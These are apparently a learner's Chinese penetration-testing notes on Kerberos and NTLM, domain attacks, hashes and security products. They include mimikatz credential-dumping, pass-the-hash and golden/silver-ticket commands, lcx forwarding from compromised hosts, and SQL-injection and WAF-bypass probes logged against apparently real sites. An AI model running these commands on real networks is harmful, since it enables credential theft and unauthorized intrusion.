<ol>
<li><p>client与AS交互   （认证客户端身份）</p>
<blockquote>
<p>发起认证请求 —-&gt;</p>
<p>认证通过,返回TGT &lt;——</p>
</blockquote>
</li>
<li><p>client与TGS交互  （请求服务授权）</p>
<blockquote>
<p>请求访问应用服务—–&gt;</p>
<p>TGT验证通过，返回TGS&lt;——</p>
</blockquote>
</li>
<li><p>client与server交互  （发送请求服务）</p>
<blockquote>
<p>使用TGS请求访问服务—-&gt;</p>
<p>TGS校验通过，允许访问&lt;——</p>
</blockquote>
</li>
</ol>
<p>具体详情见:<a href="http://t.csdn.cn/Uo35P">CSDN李火火的安全圈</a></p>
<p>流程理解：</p>
<blockquote>
<p> 目的是坐飞机，但是要有机票(TGT)，去购票处(AS)先进行客户端认证一波，拿到TGT，登机时，检票口(TGS)要求出示机票(TGT)，之后，显示座位号(Ticket)，可以坐到座位上</p>
</blockquote>
<p>这个理解来自<a href="http://t.csdn.cn/Ha6pl">CSDN思源湖的鱼</a></p>
<h3 id="NTLM协议流程"><a href="#NTLM协议流程" class="headerlink" title="NTLM协议流程"></a>NTLM协议流程</h3><p>采用一种质询&#x2F;应答消息交换模式</p>
<p>一、用户输入windows账号和密码登录客户端主机。客户端会缓存输入的密码哈希，原始密码被丢弃。成功登录的客户端windows的用户尝试访问服务器资源，发送请求，包含一个明文用户名。</p>
<p>二、服务器接收该请求，生成16位的随机数，即Challenge，明文发送给对方，并自己保存。</p>
<p>三、客户端收到challenge，用第一步保存的密码哈希值对其加密，将加密后的challenge发送给服务器。</p>
<p>四、服务器收到加密的challenge，向DC发送针对客户端的验证请求。包含(客户端用户名、客户端密码<strong>哈希值加密的challenge</strong>和原始的challenge)</p>
<p>五、DC根据用户名获取该账号的密码哈希值，对原始的challenge加密。比对发送的<strong>加密后的challenge</strong>，一致则通过，否则失败，DC将验证结果发送给服务器，并反馈给客户端。</p>
<p><strong>NTLM协议的认证过程分为三步：</strong></p>
<blockquote>
<p>1、协商：主要用于确认双方协议版本（NTLM v1&#x2F;NTLM v2）</p>
<p>2、质询：就是挑战&#x2F;响应认证机制起作用的范畴</p>
<p>3、验证：验证主要是在质询完成后，验证结果，是认证的最后一步</p>
</blockquote>
<blockquote>
<p>ps：</p>
<p>1、Challenge是Server产生的一个16字节的随机数，每次认证随机数都不同</p>
<p>2、Response的表现形式是Net-NTLM Hash，它是由客户端提供的密码Hash加密+Server返回Challenge产生的结果(hash+challenge)</p>
</blockquote>
<p>NTLM Hash产生：假设我们的密码是admin，那么操作系统会将admin转换为十六进制，经过Unicode转换后，再调用MD4加密算法加密，这个加密结果的十六进制就是NTLM Hash。</p>
<p>password &#x3D;&#x3D;&gt; hex &#x3D;&#x3D;&gt; Unicode &#x3D;&#x3D;&gt; MD4 &#x3D;&#x3D;&gt; NTLM Hash</p>
<p>参考：<a href="http://t.csdn.cn/9iHJP">CSDN 嘎嘎不是鸭</a></p>
<h2 id="2-域安全策略攻击测试"><a href="#2-域安全策略攻击测试" class="headerlink" title="2.域安全策略攻击测试"></a>2.域安全策略攻击测试</h2><h3 id="GPP-漏洞利用-这一块不太清晰"><a href="#GPP-漏洞利用-这一块不太清晰" class="headerlink" title="GPP 漏洞利用(这一块不太清晰)"></a><strong>GPP</strong> 漏洞利用(这一块不太清晰)</h3><p>在域中，存在一个默认的共享路径：\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</p>
<p>所有域内主机都能访问，里面保存组策略相关数据，包含登录脚本配置文件等</p>
<p>访问了该域，就可以访问该域下的文件夹</p>
<h4 id="SYSVOL介绍"><a href="#SYSVOL介绍" class="headerlink" title="SYSVOL介绍"></a>SYSVOL介绍</h4><p>存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制</p>
<h4 id="给域内计算机修改管理密码测试"><a href="#给域内计算机修改管理密码测试" class="headerlink" title="给域内计算机修改管理密码测试"></a>给域内计算机修改管理密码测试</h4><p>开始-管理工具-组策略管理（win10就是 gpedit.msc）</p>
<p>选择域，如test.local，右键-&gt;在这个域中创建GPO<strong>（Group Policy Object）——组策略对象</strong>并在此处链接</p>
<p>设置-右键-编辑-用户配置-首选项-控制面板设置-本地用户和组</p>
<h3 id="PTH-pass-the-hash-攻击测试"><a href="#PTH-pass-the-hash-攻击测试" class="headerlink" title="PTH(pass the hash) 攻击测试"></a>PTH(pass the hash) 攻击测试</h3><p>获取一台主机的本地管理员组成员账号的口令NTLM后，不需要破解密码，使用PTH方法将管理员账号及NTLM注入当前会话作为凭据</p>
<p>利用该凭据可以渗透获取周围的主机的管理权限，对方需要存在相同账号。</p>
<blockquote>
<p>利用mimikatz.exe读取hash密文</p>
<p>mimikatz.exe privilege::debug lsadump::lsa &#x2F;patch 得到hash密文</p>
<p>mimikatz.exe “privilege::debug” “lsadump::lsa &#x2F;patch” exit &gt;&gt;log2.txt</p>
<p>拿到我们的攻击机上导入得到的hash来链接目标机</p>
<p>mimikatz.exe “privilege::debug” “sekurlsa::pth &#x2F;domain:cracer &#x2F;user:admin &#x2F;ntlm:f5082729365bda3f34f598f99b33b242” exit</p>
<p>执行完上步命令后会得到一个cmd</p>
<p>输入命令:dir c:\ &gt;&gt; \192.168.30.191\users\admin\test.txt</p>
<p>psexec.exe <a href="file://192.168.3.130/">\192.168.3.130</a> cmd.exe</p>
</blockquote>
<h3 id="黄金票据攻击"><a href="#黄金票据攻击" class="headerlink" title="黄金票据攻击"></a>黄金票据攻击</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>黄金票据攻击发生在我们知道域中的<strong>tgt验证用户krbtgt</strong>的密码hash的情况下，可以利用krbtgt用户的密码hash直接伪造一个任意用户的TGT出来，实现伪造域内特权账号执行任意指令的操作。</p>
<h4 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h4><p>由于krbtgt账号不会被登录，且密码是定期修改的随机字符串，导致我们几乎不可能在拿到域控之前获得krbtgt账号的密码或hash。所以一般用作<strong>后期维持权限</strong>的操作</p>
<p>条件：</p>
<blockquote>
<p>域名</p>
<p>域的SID 值</p>
<p>域的KRBTGT账户NTLM密码哈希</p>
<p>伪造用户名</p>
</blockquote>
<p>实验环境：域控制器为win server2016，域计算机为win10</p>
<p>谨以演示为目的直接以域控管理员身份直接获得hash，实际情况是要免杀什么的。</p>
<p>1.在域控上以<strong>管理员</strong>身份运行cmd，获取票据伪造所需信息：</p>
<p><strong>比如用户krbtst的hash和域的sid信息</strong></p>
<blockquote>
<p>mimikatz.exe “privilege::debug” “lsadump::lsa &#x2F;patch” exit &gt;1.txt</p>
</blockquote>
<p>NTLM加密的就是密码hash</p>
<p>域的sid whoami &#x2F;all</p>
<p>2.用普通域用户登录域计算机网络 比如，xy</p>
<p>3.用mimikatz工具伪造黄金票据</p>
<blockquote>
<p>可以先执行命令查看当前是否有访问域服务的相关权限</p>
<p>dir \域控计算机名称.xy.com\c$</p>
<p>如：dir \WIN-LI5Q18SMFM2.xy.com\c$ （拒绝访问的）</p>
</blockquote>
<p>用工具伪造，生成TGT票据，ptt选项会直接存到内存中</p>
<blockquote>
<p>mimikatz.exe “kerberos::golden &#x2F;user:xyz  &#x2F;domain:xy.com  &#x2F;sid:S-1-5-21-116212833-2811902251-1975316662 &#x2F;krbtgt:789b3d4352b5a603c97cbfaf4b9a1046 &#x2F;ptt” exit</p>
</blockquote>
<p>cmd输入klist，可看到当前登录ID和缓存的票证</p>
<p>klist purge 清除票据</p>
<p>利用psexec 调用目标域控制器的cmd</p>
<blockquote>
<p>psexec.exe \WIN-LI5Q18SMFM2.xy.com cmd.exe</p>
</blockquote>
<p>dir \DC\c$应该可以用了。</p>
<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><p>禁用KRBTGT帐户，并保存当前的密码以及以前的密码。</p>
<p>建议定期更改KRBTGT密码</p>
<h3 id="白银票据攻击"><a href="#白银票据攻击" class="headerlink" title="白银票据攻击"></a>白银票据攻击</h3><p>需要用到的条件：</p>
<blockquote>
<ol>
<li><p>dc的ip地址</p>
</li>
<li><p>域的sid</p>
</li>
<li><p>目标机器的FQDN</p>
</li>
<li><p>可利用的服务</p>
</li>
<li><p>域控机的hash(是目标机,不一定是域控)</p>
</li>
<li><p>需要伪造的用户名</p>
</li>
</ol>
</blockquote>
<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>白银票据的利用限制增加了很多，需要拥有提供服务的账号的密码hash才能成功进行。这一步是在伪造向服务提供的票据，由于不需要和KDC交互，所以攻击的隐秘性更高。</p>
<blockquote>
<p>黄金票据是伪造TGT（门票发放票），而白银票据则是伪造ST（门票）</p>
<p>但是伪造的门票只对部分服务起作用,如cifs（文件共享服务），mssql，winrm（windows远程管理），DNS等等</p>
</blockquote>
<h4 id="局限-1"><a href="#局限-1" class="headerlink" title="局限"></a>局限</h4><p>需要提供服务的账号的hash，但由于真正有价值的服务往往是由域控主机运行的，所以这一个攻击在现实中依旧是常常被运用在权限维持上。</p>
<p>实验环境：</p>
<blockquote>
<p>08 为dc ip： 192.168.8.100</p>
<p>win7 域内主机：伪造票据</p>
</blockquote>
<p>获取信息：</p>
<p>1.ping 域名，就可以获取域控ip</p>
<p>2.whoami &#x2F;all 获取域sid</p>
<p>如：S-1-5-21-2511895695-3322341454-56546430-1104，”<strong>-1104</strong>“是一个 RID（Relative Identifier）部分，可省略</p>
<p>3.目标及其的FQDN</p>
<p>FQDN(完全限定域名)，主机名和域名的组合，并以根域名结尾。</p>
<p>如 <code>host.domain.com</code>。其中，<code>host</code> 是主机名，<code>domain.com</code> 是域名。</p>
<blockquote>
<p>net time &#x2F;domain<br>就是hostname+域名 &#x2F;target:\\WIN-9JJK4CNGD41.xy.com</p>
</blockquote>
<p>4.可利用的服务cifs(windows 文件共享)</p>
<p>5.获取域控的hash:</p>
<blockquote>
<p>mimikatz.exe “privilege::debug” “sekurlsa::logonpasswords” exit &gt;&gt; 2.txt</p>
</blockquote>
<p>6.要伪造的用户名</p>
<p>使用mimikatz伪造指定用户的票据并注入到内存</p>
<p><code>kerberos::golden /domain:域名 /sid:填sid /target:完整的域控名 /service:cifs /rc4:服务账号NTMLHASH /user:用户名 /ptt</code></p>
<blockquote>
<p>mimikatz.exe “kerberos::golden &#x2F;user:xyzz &#x2F;domain:xy.com &#x2F;sid:S-1-5-21-2511895695-3322341454-56546430 &#x2F;target:WIN-9JJK4CNGD41.xy.com &#x2F;service:cifs &#x2F;rc4:哈希值 &#x2F;ptt” exit</p>
</blockquote>
<p>最后</p>
<blockquote>
<p>psexec.exe \WIN-LI5Q18SMFM2.xy.com cmd.exe即可</p>
</blockquote>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>黄金票据：是直接抓取域控中<strong>kRbtgt</strong>账号的hash，来在client端生成一个TGT票据，那么该票据是<strong>针对所有机器的所有服务</strong>。</p>
<p>白银票据：实际就是在抓取到了<strong>域控</strong>服务hash的情况下，在client端以一个<strong>普通域</strong>用户的身份生成TGS票据，并且是<strong>针对于某个机器上的某个服务</strong>的，生成的白银票据,只能<strong>访问指定的target机器中指定的服务</strong>。</p>
<p>Golden Ticket 和Silver Ticket都会在日志</p>
<p>不同的是，Golden Ticket会在域控中留下日志，Silver Ticket 仅在目标系统留下日志</p>
<p>因为Silver Ticket 不与KDC产生交互产生的日志中，应该关注事件ID 4624（账户登录）、4634（账户注销)、4672（管理员登录)，并且域字段应该为Domain 时为空</p>
<h4 id="黄金票据与白银票据参考"><a href="#黄金票据与白银票据参考" class="headerlink" title="黄金票据与白银票据参考"></a>黄金票据与白银票据参考</h4><p><a href="http://t.csdn.cn/b7iDz">csdn彤彤学安全</a></p>
<p><a href="http://t.csdn.cn/Ha6pl">CSDN思源湖的鱼</a></p>
<h3 id="热土豆提权"><a href="#热土豆提权" class="headerlink" title="热土豆提权"></a>热土豆提权</h3><h3 id="Responder-WPAD-提权"><a href="#Responder-WPAD-提权" class="headerlink" title="Responder -WPAD 提权"></a>Responder -WPAD 提权</h3><h1 id="5-跨域环境渗透"><a href="#5-跨域环境渗透" class="headerlink" title="5.跨域环境渗透"></a>5.跨域环境渗透</h1>]]></content>
      <categories>
        <category>内网穿透</category>
      </categories>
      <tags>
        <tag>内网穿透</tag>
      </tags>
  </entry>
  <entry>
    <title>回归课本</title>
    <url>/2023/07/04/%E5%9B%9E%E5%BD%92%E8%AF%BE%E6%9C%AC/</url>
    <content><![CDATA[<h1 id="一、web渗透必备技术"><a href="#一、web渗透必备技术" class="headerlink" title="一、web渗透必备技术"></a>一、web渗透必备技术</h1><h2 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h2><p>虚拟专用网络，该技术提供了一种通过<strong>公用</strong>网络安全地对企业<strong>内部专用</strong>网络进行远程访问的连接方式。分为软件VPN与硬件VPN</p>
<p>三个基本要素：</p>
<blockquote>
<p>IP封装:即一个IP包包含其他IP包</p>
<p>加密的身份认证:安全有效地验证远程用户的身份</p>
<p>数据有效负载加密：加密被封装的数据</p>
</blockquote>
<h3 id="VPN服务器"><a href="#VPN服务器" class="headerlink" title="VPN服务器"></a>VPN服务器</h3><p>一般建立独立的vpn服务器，或者在肉鸡上建立vpn服务器（权限尽量低）</p>
<p>当然了，肉鸡不一定能遇上，所以一般会使用现成的VPN软件。</p>
<h4 id="win-2003-server创建-vpn服务器"><a href="#win-2003-server创建-vpn服务器" class="headerlink" title="win 2003 server创建 vpn服务器"></a>win 2003 server创建 vpn服务器</h4><p>1.管理工具-&gt;路由和远程访问</p>
<p>2.启动路由和远程访问</p>
<p>3.关闭防火墙</p>
<p>4.配置并启用路由和远程访问</p>
<p>5.选择启用的服务：VPN访问、NAT和基本防火墙</p>
<p>6.配置NAT&#x2F;基本防火墙-&gt;选择接口 （选择本地连接，该IP地址必须是互联网独立IP地址）</p>
<p>7.公用接口上启用NAT</p>
<p>8.启用远程访问和路由(LAN,远程)</p>
<p>9.配置日志（不记录任何事件），重启路由器</p>
<p>10.授权用户远程访问：本地用户和组的test用户（尽量是低权限的普通用户），在“拨入”窗口中，选择允许访问即可。</p>
<p>netstat -an | Find “1723” 可查看VPN服务是否开启</p>
<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><p>局域网的某主机只开放了Web服务，只有内网的机器才能访问到</p>
<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>想办法将肉鸡A的3389打开，通过<strong>端口转发工具</strong>(如lcx)端口映射到具有外网IP地址的B机上，进而攻击者在本地连接到被控主机的远程终端</p>
<h4 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h4><p>1.<strong>在靶机端</strong>，输入</p>
<blockquote>
<p>lcx -slave xxxxx 51 yyyy 3389</p>
</blockquote>
<p>即将靶机yyyy的3389端口转发到远程地址xxxx的51端口</p>
<p>2.<strong>在攻击机端</strong></p>
<blockquote>
<p>lcx -lister 51 3389</p>
</blockquote>
<p>在攻击机端监听51端口，接收被控端3389端口转发来的数据</p>
<p>这个原理，与瑞士军刀netcat，一样吧</p>
<p>3.在<strong>攻击机端</strong>的命令行输入mstsc，弹出远程桌面连接窗口，输入127.0.0.1连接，输入用户名和密码进行连接</p>
<h2 id="域名查询"><a href="#域名查询" class="headerlink" title="域名查询"></a>域名查询</h2><p>顶级域名</p>
<p>.com	.net	.org</p>
<p>二级域名</p>
<p>.edu .gov</p>
<h3 id="在渗透中的作用"><a href="#在渗透中的作用" class="headerlink" title="在渗透中的作用"></a>在渗透中的作用</h3><p>域名地址定位；IP地址查询域名注册情况</p>
<h3 id="查询方式"><a href="#查询方式" class="headerlink" title="查询方式"></a>查询方式</h3><p>IP地址反查域名注册情况；域名查IP</p>
<h3 id="推荐网址"><a href="#推荐网址" class="headerlink" title="推荐网址"></a>推荐网址</h3><p>whois；站长之家</p>
<h3 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h3><p>已知baidu.com</p>
<p>那么可能有email.baidu.com ; www. baidu.com……</p>
<p>运用工具layer子域名挖掘机或oneforall，通过字典去枚举即可</p>
<h3 id="旁站查询"><a href="#旁站查询" class="headerlink" title="旁站查询"></a>旁站查询</h3><p>主目标网站渗透未果，则扫描相同IP地址段下的其他IP（一般是C段扫描），对其他IP地址渗透。</p>
<p>渗透成功后，通过嗅探等手段截获目标网站密码。</p>
<h2 id="获取windows系统的Hash密码"><a href="#获取windows系统的Hash密码" class="headerlink" title="获取windows系统的Hash密码"></a>获取windows系统的Hash密码</h2><p>windows系统的Hash密码主要由LM-HASH和NTLM-HASH两部分组成。攻击者如果获取了系统的HASH值，通过彩虹表等手段获取到系统的密码。</p>
<h3 id="Hash基本知识"><a href="#Hash基本知识" class="headerlink" title="Hash基本知识"></a>Hash基本知识</h3><p>散列，或哈希；散列算法，使得输入值变换成固定长度的输出，称为散列值。由于算法的碰撞性（应该是这个吧），不同的输入是有可能散列成相同的输出的，所以，散列值和输入值不是一一对应的。</p>
<p>它应用于信息安全领域中的加密算法，将不同长度的信息转化成杂乱的128位的编码中。</p>
<h3 id="Hash算法在密码上的应用"><a href="#Hash算法在密码上的应用" class="headerlink" title="Hash算法在密码上的应用"></a>Hash算法在密码上的应用</h3><p>常见的MD5、SHA1</p>
<p>应用主要是：</p>
<p>1.文件校验</p>
<p>2.数字签名</p>
<p>3.鉴权协议（挑战-认证模式）</p>
<h3 id="windows下Hash密码值"><a href="#windows下Hash密码值" class="headerlink" title="windows下Hash密码值"></a>windows下Hash密码值</h3><h4 id="1-Hash密码格式"><a href="#1-Hash密码格式" class="headerlink" title="1.Hash密码格式"></a>1.Hash密码格式</h4><p><strong>用户名称:RID:LM-Hash:NTLM-Hash</strong></p>
<blockquote>
<p>如:</p>
<p>Administrator:500:C8825DB10F2590EAAAD3B435B51404EE:683020925C5D8569C23AA724774CE6CC</p>
</blockquote>
<h4 id="2-LM-Hash生成原理"><a href="#2-LM-Hash生成原理" class="headerlink" title="2.LM-Hash生成原理"></a>2.LM-Hash生成原理</h4><p>以输入为:welcome为例</p>
<p><strong>先全转化为大写</strong>:</p>
<blockquote>
<p>WELCOME</p>
</blockquote>
<p> ——&gt;</p>
<p>再变成<strong>十六进制</strong>字符串 (若不足14字节，0x00去补)：</p>
<blockquote>
<p>57454C434F4D4500000000000000</p>
</blockquote>
<p>——&gt;</p>
<p><strong>分割</strong>成<strong>两组7字节</strong>数据，分别用str_to_key()函数处理得到两组8字节数据</p>
<blockquote>
<p>57454C434F4D45 -str_to_key()-&gt; 56A25288347A348A<br>00000000000000 -str_to_key()-&gt; 0000000000000000</p>
</blockquote>
<p>——&gt;</p>
<p>这两组8字节数据将做为DESKEY对魔术字符串“KGS!@#$%”<strong>进行标准DES加密</strong></p>
<blockquote>
<p>“KGS!@#$%” -&gt; 4B47532140232425<br>56A25288347A348A -对4B47532140232425进行标准DES加密-&gt; C23413A8A1E7665F<br>0000000000000000 -对4B47532140232425进行标准DES加密-&gt; AAD3B435B51404EE</p>
</blockquote>
<p>将加密后的这两组数据简单<strong>拼接</strong>，就得到了最后的LM Hash</p>
<blockquote>
<p>LM Hash: C23413A8A1E7665FAAD3B435B51404EE</p>
</blockquote>
<h4 id="3-NTLM-Hash生成原理"><a href="#3-NTLM-Hash生成原理" class="headerlink" title="3.NTLM-Hash生成原理"></a>3.NTLM-Hash生成原理</h4><p>以输入为:123456为例</p>
<p><strong>先转换成unicode字符串</strong>(无需补足14字节)</p>
<p><strong>MD4固定产生128bit哈希值</strong></p>
<p>与LM-Hash相比，明文口令大小写敏感；摆脱了魔术字符串；MD4是真正的单向哈希函数</p>
<h3 id="获取密码工具"><a href="#获取密码工具" class="headerlink" title="获取密码工具"></a>获取密码工具</h3><p>gethashes（System权限下），和mimikatz</p>
<p>一般都是免杀上传到靶机上去，运行获得靶机的hash值，如果是域控的话，那就获得了很多账号密码了。</p>
<h3 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h3><p>Ms08067漏洞利用工具获得漏洞主机的反弹shell，上传工具，执行命令。</p>
<p>1.获得反弹shell后，尝试查看系统是否有杀毒软件，并试图关闭，关不了，放弃这一步</p>
<p>2.看是否能开启3389远程终端，利用该端口，直接添加一个具有管理员权限用户，本地登录到该系统</p>
]]></content>
      <categories>
        <category>web渗透</category>
      </categories>
      <tags>
        <tag>web渗透</tag>
        <tag>vpn</tag>
      </tags>
  </entry>
  <entry>
    <title>安全产品</title>
    <url>/2023/07/01/%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81/</url>
    <content><![CDATA[<p>作用，原理，部署位置</p>
<h1 id="一、WF"><a href="#一、WF" class="headerlink" title="一、WF"></a>一、WF</h1><p>基础防火墙</p>
<p>主要是可实现基本包过滤策略的防火墙，限制对IP:port的访问。</p>
<p>基本上的实现都是默认情况下关闭所有的通过型访问，只开放允许访问的策略。FW可以拦截低层攻击行为，但对应用层的深层攻击行为无能为力。</p>
<p> FW部署位置一般为外联出口或者区域性出口位置，对内外流量进行安全隔离。</p>
<p>公共网络&lt;-边界路由器与核心交换机之间-&gt;(用户工作区、服务器组群)</p>
<h1 id="二、WAF"><a href="#二、WAF" class="headerlink" title="二、WAF"></a>二、WAF</h1><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>WAF对请求的内容进行规则匹配、行为分析等识别出恶意行为，并执行相关动作，这些动作包括阻断、记录、告警等。</p>
<p>流量识别、攻击检测、攻击响应、日志记录</p>
<h2 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h2><p><strong>部署时要使WAF尽量靠近WEB服务器</strong>，对基于HTTP协议的通信进行检测和识别。通俗的说，WAF类似于地铁站的安检，对于HTTP请求进行快速安全检查，通过解析HTTP数据，在不同的字段分别在特征、规则等维度进行判断，判断的结果作为是否拦截的依据从而决定是否放行。</p>
<p>sqlmap可以识别waf种类。</p>
<p> 透明代理模式、反向代理模式、路由代理模式及端口镜像模式。</p>
<p>前三种模式为线上，串行部署web服务器前端，检测并阻断异常流量。</p>
<p>端口镜像模式将WAF旁路接在WEB服务器上游的交换机上，只用于检测异常流量。</p>
<h1 id="三、IDS-被动"><a href="#三、IDS-被动" class="headerlink" title="三、IDS(被动)"></a>三、IDS(<strong>被动</strong>)</h1><p>IDS（入侵检测系统）就是依照一定的安全策略，对网络、系统的运行状况进行监视，尽可能发现各种攻击企图、攻击行为或者攻击结果，以保证网络系统资源的机密性、完整性和可用性</p>
<p><strong>特点是不阻断任何网络访问，主要以提供报告和事后监督为主</strong></p>
<p><strong>以旁路为主</strong></p>
<h2 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h2><p>实时监测、安全审计、主动响应</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>1.信息收集</p>
<p>收集的内容包括系统、网络、数据及用户活动的状态和行为</p>
<p>2.数据分析</p>
<p>模式匹配：收集到的信息与已知的网络入侵和系统误用模式数据库进行比较，从而发现违背安全策略的行为</p>
<p>统计分析：统计正常使用时的一些测量属性（如访问次数、操作失败 次数和延时等）。测量属性的平均值将被用来与网络、系统的行为进行比 较，任何观察值如果超过了正常值范围，就认为有入侵发生</p>
<p>完整性分析：主要关注某个文件或对象是否被更改，这经常包括文件和 目录的内容及属性，它在发现被修改成类似特洛伊木马的应用程序方面特 别有效。</p>
<h1 id="四、IPS（主动）"><a href="#四、IPS（主动）" class="headerlink" title="四、IPS（主动）"></a>四、IPS（主动）</h1><p> 解决了IDS无法阻断的问题，基本上以在线模式为主，系统提供多个端口，以透明模式工作。<strong>本质是增强入侵行为库，检测出后自动进行防御</strong>(主要为模式匹配)</p>
<p>缺点在于<strong>不能主动的学习</strong>攻击方式，对于模式库中不能识别出来的攻击，默认策略是允许访问的。</p>
<p><strong>常被串接在主干路上</strong></p>
<h2 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h2><p>通过直接嵌入到网络流量中，利用一个网络端口接收外部流量，经过检查确认其中不包含异常活动或可疑内容，再通过另一个端口转发给内部系统（实际是对恶意流量进行清洗）。</p>
<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>过滤器，能够防止各种攻击</p>
]]></content>
      <categories>
        <category>安全产品</category>
      </categories>
      <tags>
        <tag>WF</tag>
        <tag>WAF</tag>
        <tag>IPS</tag>
      </tags>
  </entry>
  <entry>
    <title>实战记录</title>
    <url>/2023/07/01/%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<h1 id="1-web1"><a href="#1-web1" class="headerlink" title="1.web1"></a>1.web1</h1><h2 id="access注入"><a href="#access注入" class="headerlink" title="access注入"></a>access注入</h2><p>Access数据库中没有注释符号.因此 &#x2F;**&#x2F; 、 – 和 # 都没法使用。<br>Access是小型数据库，当容量到达100M左右的时候性能就会开始下降。<br>Access数据库不支持错误显示注入，Access数据库不能执行系统命令。</p>
<blockquote>
<p>select len(“string”)        查询给定字符串的长度<br>select asc(“a”)             查询给定字符串的ascii值<br>top  n                      查询前n条记录<br>select mid(“string”,2,1)    查询给定字符串从指定索引开始的长度</p>
</blockquote>
<p>and 1&#x3D;1正常</p>
<p>and 1&#x3D;2页面空白</p>
<p>存在数字型注入</p>
<p>id&#x3D;33 order by 6#</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230705092013304.png"></p>
<p>id&#x3D;33 order by 5</p>
<p>id&#x3D;-33%20union%20select%201,2,3,4,5</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230705092329310.png"></p>
<p>-33%20union%20select%201,2,3,4,5%20from%20user</p>
<blockquote>
<p>FROM 子句语法错误。</p>
</blockquote>
<p>给表字段加入[user]</p>
<p>id&#x3D;-33%20union%20select%201,2,3,4,5%20from%20[MSysObjects]</p>
<blockquote>
<p>不能读取记录；在 ‘MSysObjects’ 上没有读取数据权限。</p>
</blockquote>
<p>尝试了基本的表名如admin,user,manager,name等无果，不再尝试</p>
<h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230705095051817.png"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230705094840425.png"></p>
<h1 id="2-web2"><a href="#2-web2" class="headerlink" title="2.web2"></a>2.web2</h1><p>xsk.asp?id&#x3D;1%20and%201&#x3D;1</p>
<p>回显</p>
<p>1&#x3D;2不回显</p>
<p>存在数字型注入</p>
<h1 id="3-web3"><a href="#3-web3" class="headerlink" title="3.web3"></a>3.web3</h1><h2 id="access注入-1"><a href="#access注入-1" class="headerlink" title="access注入"></a>access注入</h2><p>id&#x3D;12’</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230706113557290.png"></p>
<p>id&#x3D;12 and 1&#x3D;1 和id&#x3D;12 and 1&#x3D;2不同，则判断数字型注入</p>
<p>id&#x3D;12 order by 7#错误</p>
<p>id&#x3D;12 order by 6#正确</p>
<p>id&#x3D;-12%20union%20select%201,2,3,4,5,6</p>
<blockquote>
<p>Microsoft OLE DB Provider for ODBC Drivers ���� ‘80040e21’</p>
<p>ODBC ��������֧����������ԡ�</p>
<p>&#x2F;about.asp���� 16</p>
</blockquote>
<p>chrom插件charset为gbk即可</p>
<blockquote>
<p>Microsoft OLE DB Provider for ODBC Drivers 错误 ‘80040e21’</p>
<p>ODBC 驱动程序不支持所需的属性。</p>
<p>&#x2F;about.asp，行 16</p>
</blockquote>
<p>id&#x3D;12 and user&gt;0  </p>
<blockquote>
<p>ODBC 驱动程序不支持所需的属性。</p>
</blockquote>
<p>判断为access注入</p>
<h1 id="4、d盾"><a href="#4、d盾" class="headerlink" title="4、d盾"></a>4、d盾</h1><p>数字型注入不存在</p>
<p>单引号、双引号禁用。撤</p>
<p>id&#x3D;10 and 1&#x3D;2 拦截</p>
<p>id&#x3D; 10 &amp;&amp;(||) 1&#x3D;2 参数错误</p>
<h1 id="5、web5"><a href="#5、web5" class="headerlink" title="5、web5"></a>5、web5</h1><p>检测 and(or) 数字 、&amp;&amp;(||)  数字</p>
<p>id&#x3D;1’  id&#x3D;2” 无回显</p>
<h1 id="6、web6"><a href="#6、web6" class="headerlink" title="6、web6"></a>6、web6</h1><p>id&#x3D;1</p>
<p>id&#x3D;2’   id&#x3D;2 and 1&#x3D;2</p>
<p>会跳回到id&#x3D;1界面</p>
<p>撤</p>
<h1 id="7-web7"><a href="#7-web7" class="headerlink" title="7.web7"></a>7.web7</h1><p>id&#x3D;1 and 1&#x3D;1   1&#x3D;2 数字型注入</p>
<p>id&#x3D;1 order by 1#显示错误。那就是有waf了，撤</p>
<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>id&#x3D;12 and 1&#x3D;1 拦截</p>
<p>id&#x3D; 12 and 无回显</p>
<p>id &#x3D;12 and 2无回显</p>
<p>id&#x3D;12 and 2&#x3D;1拦截</p>
<p>id&#x3D;12 and 2 like 1 无回显</p>
<p>id&#x3D;12 and 2 like 2回显</p>
<p>存在数字型注入</p>
<p>id&#x3D;12%20order%20by 无回显</p>
<p>id&#x3D;12%20order%20by%201# 无回显</p>
<p>考虑延时注入</p>
<p>1’ and sleep(5)–+ 5s后显示</p>
<p>and if(length(database())&gt;0,sleep(5),1)# </p>
<p>没效果就and 改为 or</p>
<p><strong>过滤了user(),database(),version(),sleep(),benchmark()、concat、load_file()</strong></p>
<p> 撤</p>
<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>1&#x3D;1 和 1&#x3D;2 判断存在sql注入</p>
